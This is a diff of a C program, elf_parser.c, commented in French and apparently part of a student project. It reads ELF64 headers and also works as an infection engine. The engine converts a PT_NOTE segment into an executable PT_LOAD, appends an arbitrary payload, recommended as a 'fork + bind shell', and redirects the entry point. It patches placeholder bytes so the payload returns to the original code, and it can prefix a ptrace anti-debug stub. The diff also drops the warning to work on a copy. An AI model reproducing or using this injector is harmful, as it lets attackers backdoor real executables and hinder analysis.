@@ -1,11 +1,17 @@
 /*
  * elf_parser.c — Lecteur ELF64 + Moteur d'infection (Personne A)
  *
- * Phase A (lecture) : affiche l'en-tête et les program headers.
- * Phase B (injection) :
  *   CASE 1 : Conversion PT_NOTE → PT_LOAD
- *   CASE 2 : Insertion du shellcode + trampoline retour e_entry
+ *   CASE 2 : Insertion du payload + patch e_entry + retour propre
  *   CASE 3 : Protected ELF (anti-debug)  [optionnel -DPROTECTED_ELF]
+ *
+ * Le payload peut être :
+ *   - un shellcode simple (execve /bin/sh) → pas de retour possible
+ *   - un payload "fork + bind shell + retour" (recommandé)
+ *
+ * Le moteur patche automatiquement les placeholders 0x4141414141414141
+ * du payload par l'ancienne e_entry, pour permettre le retour au
+ * binaire original depuis le père du fork.
  *
  * Compilation :
  *   gcc -Wall -Wextra -o elf_parser elf_parser.c
@@ -13,10 +19,9 @@
  *
  * Usage :
  *   ./elf_parser <fichier_elf>              → mode lecture
- *   ./elf_parser <fichier_elf> <sc.bin>     → mode injection
+ *   ./elf_parser <fichier_elf> <payload>    → mode injection
  *
  * ATTENTION : en mode injection, le fichier cible est MODIFIÉ.
- *             Travailler sur une COPIE.
  */
 
 #include <stdio.h>
@@ -26,10 +31,9 @@
 #include <elf.h>
 
 /* ============================================================
- * PARTIE 1 — LECTURE (ton code d'origine)
+ * PARTIE 1 — LECTURE
  * ============================================================ */
 
-/* Traduit un p_type (valeur numerique) en nom lisible. */
 static const char *nom_type_segment(Elf64_Word type) {
     switch (type) {
         case PT_NULL:         return "NULL";
@@ -48,29 +52,21 @@ static const char *nom_type_segment(Elf64_Word type) {
     }
 }
 
-/* Lit l'en-tete ELF dans 'ehdr'. Verifie le magic + classe 64 bits.
-   Retourne 0 si OK, -1 en cas d'erreur. */
 static int lire_entete(FILE *f, Elf64_Ehdr *ehdr) {
-    if (fseek(f, 0, SEEK_SET) != 0) {
-        perror("fseek(entete)");
-        return -1;
-    }
+    if (fseek(f, 0, SEEK_SET) != 0) { perror("fseek"); return -1; }
     if (fread(ehdr, sizeof(*ehdr), 1, f) != 1) {
-        fprintf(stderr, "Erreur : fichier trop petit pour un en-tete ELF64.\n");
+        fprintf(stderr, "Erreur : fichier trop petit.\n");
         return -1;
     }
     if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
-        fprintf(stderr, "Erreur : ce fichier n'est pas un ELF.\n");
-        return -1;
+        fprintf(stderr, "Erreur : pas un ELF.\n"); return -1;
     }
     if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
-        fprintf(stderr, "Erreur : binaire non 64 bits (non supporte).\n");
-        return -1;
+        fprintf(stderr, "Erreur : pas 64 bits.\n"); return -1;
     }
     return 0;
 }
 
-/* Affiche les champs cles de l'en-tete. */
 static void afficher_entete(const Elf64_Ehdr *ehdr) {
     printf("== En-tete ELF ==\n");
     printf("  Type (e_type)        : %u\n", ehdr->e_type);
@@ -80,28 +76,20 @@ static void afficher_entete(const Elf64_Ehdr *ehdr) {
     printf("  Taille d'un phdr     : %u\n\n",  ehdr->e_phentsize);
 }
 
-/* Lit et affiche la table des program headers.
-   Retourne 0 si OK, -1 en cas d'erreur. */
 static int afficher_program_headers(FILE *f, const Elf64_Ehdr *ehdr) {
     if (fseek(f, ehdr->e_phoff, SEEK_SET) != 0) {
-        perror("fseek(phdr)");
-        return -1;
+        perror("fseek(phdr)"); return -1;
     }
-
     printf("== Program headers (%u) ==\n", ehdr->e_phnum);
     printf("  #   Type          Offset      VirtAddr      FileSiz   Flags\n");
-
     for (unsigned int i = 0; i < ehdr->e_phnum; i++) {
         Elf64_Phdr phdr;
         if (fread(&phdr, sizeof(phdr), 1, f) != 1) {
-            fprintf(stderr, "Erreur : lecture du phdr %u impossible.\n", i);
-            return -1;
+            fprintf(stderr, "Erreur phdr %u.\n", i); return -1;
         }
         printf("  %-2u  %-12s  0x%08lx  0x%010lx  0x%06lx  %c%c%c\n",
-               i,
-               nom_type_segment(phdr.p_type),
-               (unsigned long)phdr.p_offset,
-               (unsigned long)phdr.p_vaddr,
+               i, nom_type_segment(phdr.p_type),
+               (unsigned long)phdr.p_offset, (unsigned long)phdr.p_vaddr,
                (unsigned long)phdr.p_filesz,
                (phdr.p_flags & PF_R) ? 'R' : '-',
                (phdr.p_flags & PF_W) ? 'W' : '-',
@@ -111,39 +99,27 @@ static int afficher_program_headers(FILE *f, const Elf64_Ehdr *ehdr) {
 }
 
 /* ============================================================
- * PARTIE 2 — CASE 3 : stub anti-debug (Protected ELF)
+ * PARTIE 2 — CASE 3 : stub anti-debug
  * ============================================================ */
 #ifdef PROTECTED_ELF
-/* ptrace(PTRACE_TRACEME) → si retour == -1 → debugger attaché → exit(60)
- *
- * ⚠️ Important : le "jne" doit sauter 5 octets (taille du bloc exit),
- *                PAS 6 — sinon on atterrit au milieu du prologue suivant.
- */
 static const unsigned char stub_antidebug[] = {
-    0x48, 0xC7, 0xC0, 0x65, 0x00, 0x00, 0x00,   /* mov rax, 101         */
-    0x48, 0x31, 0xFF,                            /* xor rdi, rdi         */
-    0x48, 0x31, 0xF6,                            /* xor rsi, rsi         */
-    0x48, 0x31, 0xD2,                            /* xor rdx, rdx         */
-    0x49, 0x31, 0xD2,                            /* xor r10, r10         */
-    0x0F, 0x05,                                  /* syscall              */
-    0x48, 0x83, 0xF8, 0xFF,                      /* cmp rax, -1          */
-    0x75, 0x05,                                  /* jne +5 (continuer)   */
-    0x6A, 0x3C, 0x58, 0x0F, 0x05                 /* exit(60)             */
+    0x48, 0xC7, 0xC0, 0x65, 0x00, 0x00, 0x00,
+    0x48, 0x31, 0xFF, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x49, 0x31, 0xD2,
+    0x0F, 0x05, 0x48, 0x83, 0xF8, 0xFF, 0x75, 0x05,
+    0x6A, 0x3C, 0x58, 0x0F, 0x05
 };
 #endif
 
 /* ============================================================
- * PARTIE 3 — CASE 1 : Conversion PT_NOTE → PT_LOAD
+ * PARTIE 3 — CASE 1 : PT_NOTE → PT_LOAD
  * ============================================================ */
 
-/* Trouve l'index du premier PT_NOTE. Retourne -1 si aucun. */
 static int trouver_pt_note(const Elf64_Ehdr *ehdr, const Elf64_Phdr *ph) {
     for (int i = 0; i < ehdr->e_phnum; i++)
         if (ph[i].p_type == PT_NOTE) return i;
     return -1;
 }
 
-/* Retourne la vaddr max parmi les segments LOAD. */
 static Elf64_Addr vaddr_max_load(const Elf64_Ehdr *ehdr, const Elf64_Phdr *ph) {
     Elf64_Addr max = 0;
     for (int i = 0; i < ehdr->e_phnum; i++) {
@@ -155,7 +131,6 @@ static Elf64_Addr vaddr_max_load(const Elf64_Ehdr *ehdr, const Elf64_Phdr *ph) {
     return max;
 }
 
-/* Convertit le phdr d'index idx en PT_LOAD exécutable. */
 static void convertir_en_load(Elf64_Phdr *ph, int idx,
                               Elf64_Off offset, Elf64_Addr vaddr,
                               Elf64_Xword taille) {
@@ -170,64 +145,54 @@ static void convertir_en_load(Elf64_Phdr *ph, int idx,
 }
 
 /* ============================================================
- * PARTIE 4 — CASE 2 : Payload = trampoline + shellcode + retour e_entry
- * ============================================================ */
-
-/* Construit :
- *   [push regs]  [shellcode user]  [pop regs]  [jmp ancienne_entry]
+ * PARTIE 4 — Patch des placeholders dans le payload
+ * ============================================================
+ *
+ * Le payload peut contenir un placeholder 0x4141414141414141
+ * (8 octets 'A') qui doit être remplacé par l'ancienne e_entry.
+ * C'est ce qui permet au père (après fork) de retourner à
+ * l'entry point original du binaire.
+ *
+ * Format du placeholder dans le shellcode :
+ *   48 B8 41 41 41 41 41 41 41 41 FF E0
+ *   (movabs rax, 0x4141414141414141 ; jmp rax)
  */
-static unsigned char *construire_payload(const unsigned char *sc,
-                                         size_t sc_len,
-                                         Elf64_Addr ancienne_entry,
-                                         size_t *out_len) {
-    /* push rax,rbx,rcx,rdx,rsi,rdi,rbp,r8,r9,r10,r11 */
-    static const unsigned char prologue[] = {
-        0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55,
-        0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53
+static int patcher_placeholders(unsigned char *payload, size_t len,
+                                Elf64_Addr ancienne_entry) {
+    static const unsigned char pattern[8] = {
+        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
     };
-    /* pop r11,r10,r9,r8,rbp,rdi,rsi,rdx,rcx,rbx,rax */
-    static const unsigned char epilogue[] = {
-        0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,
-        0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58
-    };
-    /* movabs rax, imm64 ; jmp rax */
-    unsigned char saut[12] = { 0x48, 0xB8 };
-    memcpy(&saut[2], &ancienne_entry, 8);
-    saut[10] = 0xFF;
-    saut[11] = 0xE0;
-
-    size_t total = sizeof(prologue) + sc_len + sizeof(epilogue) + sizeof(saut);
-    unsigned char *buf = malloc(total);
-    if (!buf) return NULL;
-
-    size_t o = 0;
-    memcpy(buf + o, prologue, sizeof(prologue)); o += sizeof(prologue);
-    memcpy(buf + o, sc, sc_len);                 o += sc_len;
-    memcpy(buf + o, epilogue, sizeof(epilogue)); o += sizeof(epilogue);
-    memcpy(buf + o, saut, sizeof(saut));
-
-    *out_len = total;
-    return buf;
+    int patches = 0;
+    for (size_t i = 0; i + 8 <= len; i++) {
+        if (memcmp(payload + i, pattern, 8) == 0) {
+            memcpy(payload + i, &ancienne_entry, 8);
+            printf("[+] Placeholder patché à l'offset %zu → 0x%lx\n",
+                   i, (unsigned long)ancienne_entry);
+            patches++;
+            i += 7;
+        }
+    }
+    return patches;
 }
 
 /* ============================================================
- * PARTIE 5 — Fonction d'injection (mode 2 arguments)
+ * PARTIE 5 — Injection
  * ============================================================ */
-static int injecter(const char *chemin_elf, const char *chemin_sc) {
-    /* 1. Lire le shellcode */
-    FILE *fsc = fopen(chemin_sc, "rb");
-    if (!fsc) { perror("fopen(shellcode)"); return EXIT_FAILURE; }
 
-    fseek(fsc, 0, SEEK_END);
-    long sc_taille = ftell(fsc);
-    fseek(fsc, 0, SEEK_SET);
+static int injecter(const char *chemin_elf, const char *chemin_payload) {
+    /* 1. Lire le payload */
+    FILE *fp = fopen(chemin_payload, "rb");
+    if (!fp) { perror("fopen(payload)"); return EXIT_FAILURE; }
+    fseek(fp, 0, SEEK_END);
+    long pl_taille = ftell(fp);
+    fseek(fp, 0, SEEK_SET);
 
-    unsigned char *sc = malloc(sc_taille);
-    if (!sc) { perror("malloc"); fclose(fsc); return EXIT_FAILURE; }
-    if (fread(sc, 1, sc_taille, fsc) != (size_t)sc_taille) {
-        perror("fread(shellcode)"); return EXIT_FAILURE;
+    unsigned char *pl = malloc(pl_taille);
+    if (!pl) { perror("malloc"); fclose(fp); return EXIT_FAILURE; }
+    if (fread(pl, 1, pl_taille, fp) != (size_t)pl_taille) {
+        perror("fread(payload)"); return EXIT_FAILURE;
     }
-    fclose(fsc);
+    fclose(fp);
 
     /* 2. Ouvrir l'ELF en lecture/écriture */
     FILE *f = fopen(chemin_elf, "r+b");
@@ -243,8 +208,7 @@ static int injecter(const char *chemin_elf, const char *chemin_sc) {
     }
     if (ehdr.e_ident[EI_CLASS] != ELFCLASS64 ||
         ehdr.e_ident[EI_DATA]  != ELFDATA2LSB) {
-        fprintf(stderr, "ELF64 little-endian requis.\n");
-        return EXIT_FAILURE;
+        fprintf(stderr, "ELF64 LE requis.\n"); return EXIT_FAILURE;
     }
 
     /* 4. Lire les program headers */
@@ -257,7 +221,7 @@ static int injecter(const char *chemin_elf, const char *chemin_sc) {
     int idx = trouver_pt_note(&ehdr, ph);
     if (idx < 0) {
         fprintf(stderr, "Aucun PT_NOTE dans ce binaire.\n");
-        free(ph); free(sc); fclose(f);
+        free(ph); free(pl); fclose(f);
         return EXIT_FAILURE;
     }
     printf("[+] PT_NOTE trouvé à l'index %d\n", idx);
@@ -269,29 +233,37 @@ static int injecter(const char *chemin_elf, const char *chemin_sc) {
     Elf64_Addr vaddr = (vaddr_max_load(&ehdr, ph) + 0xFFF) & ~0xFFFULL;
     vaddr += 0x1000;
 
-    /* ========== CASE 2 : construire le payload ========== */
-    Elf64_Addr ancienne_entry = ehdr.e_entry;
-    size_t payload_len;
-    unsigned char *payload = construire_payload(sc, sc_taille,
-                                                ancienne_entry, &payload_len);
-    if (!payload) { perror("construire_payload"); return EXIT_FAILURE; }
+    /* ========== CASE 2 : préparation du payload ========== */
 
-    /* ========== CASE 3 : ajouter le stub anti-debug ========== */
+    /* 2a. Patch des placeholders (retour e_entry) */
+    Elf64_Addr ancienne_entry = ehdr.e_entry;
+    int patches = patcher_placeholders(pl, pl_taille, ancienne_entry);
+    if (patches > 0) {
+        printf("[+] %d placeholder(s) patché(s) avec e_entry=0x%lx\n",
+               patches, (unsigned long)ancienne_entry);
+    } else {
+        printf("[!] Aucun placeholder trouvé (payload sans retour e_entry)\n");
+    }
+
+    /* 2b. Optionnel : préfixer par le stub anti-debug */
+    unsigned char *payload_final = pl;
+    size_t payload_len = pl_taille;
+
 #ifdef PROTECTED_ELF
-    size_t total = sizeof(stub_antidebug) + payload_len;
+    size_t total = sizeof(stub_antidebug) + pl_taille;
     unsigned char *pp = malloc(total);
-    if (!pp) { perror("malloc(protégé)"); return EXIT_FAILURE; }
+    if (!pp) { perror("malloc"); return EXIT_FAILURE; }
     memcpy(pp, stub_antidebug, sizeof(stub_antidebug));
-    memcpy(pp + sizeof(stub_antidebug), payload, payload_len);
-    free(payload);
-    payload     = pp;
+    memcpy(pp + sizeof(stub_antidebug), pl, pl_taille);
+    payload_final = pp;
     payload_len = total;
+    free(pl);
 #endif
 
-    /* 5. Convertir le PT_NOTE avec la taille finale */
+    /* 5. Convertir le PT_NOTE */
     convertir_en_load(ph, idx, new_offset, vaddr, payload_len);
 
-    /* 6. Rediriger e_entry */
+    /* 6. Rediriger e_entry vers notre payload */
     ehdr.e_entry = vaddr;
 
     /* 7. Réécrire l'en-tête */
@@ -305,7 +277,7 @@ static int injecter(const char *chemin_elf, const char *chemin_sc) {
     /* 9. Écrire le payload à la fin */
     fseek(f, new_offset, SEEK_SET);
     for (long i = fin_fichier; i < new_offset; i++) fputc(0x90, f);
-    fwrite(payload, 1, payload_len, f);
+    fwrite(payload_final, 1, payload_len, f);
 
     printf("[+] PT_NOTE (idx=%d) converti en PT_LOAD\n", idx);
     printf("[+] vaddr=0x%lx  offset=0x%lx  taille=%zu\n",
@@ -317,7 +289,7 @@ static int injecter(const char *chemin_elf, const char *chemin_sc) {
 #endif
     printf("[+] Terminé.\n");
 
-    free(payload); free(sc); free(ph); fclose(f);
+    free(payload_final); free(ph); fclose(f);
     return EXIT_SUCCESS;
 }
 
@@ -329,35 +301,23 @@ int main(int argc, char *argv[]) {
         fprintf(stderr,
                 "Usage :\n"
                 "  %s <fichier_elf>              (lecture seule)\n"
-                "  %s <fichier_elf> <sc.bin>     (injection)\n",
+                "  %s <fichier_elf> <payload>    (injection)\n",
                 argv[0], argv[0]);
         return EXIT_FAILURE;
     }
 
-    /* Mode injection (2 arguments) → on délègue à injecter() */
     if (argc == 3)
         return injecter(argv[1], argv[2]);
 
-    /* Mode lecture (1 argument) → comportement d'origine */
+    /* Mode lecture */
     FILE *f = fopen(argv[1], "rb");
-    if (f == NULL) {
-        perror("fopen");
-        return EXIT_FAILURE;
-    }
+    if (f == NULL) { perror("fopen"); return EXIT_FAILURE; }
 
     Elf64_Ehdr ehdr;
     int code = EXIT_SUCCESS;
-
-    if (lire_entete(f, &ehdr) != 0) {
-        code = EXIT_FAILURE;
-        goto fin;
-    }
+    if (lire_entete(f, &ehdr) != 0) { code = EXIT_FAILURE; goto fin; }
     afficher_entete(&ehdr);
-
-    if (afficher_program_headers(f, &ehdr) != 0) {
-        code = EXIT_FAILURE;
-        goto fin;
-    }
+    if (afficher_program_headers(f, &ehdr) != 0) { code = EXIT_FAILURE; }
 
 fin:
     fclose(f);
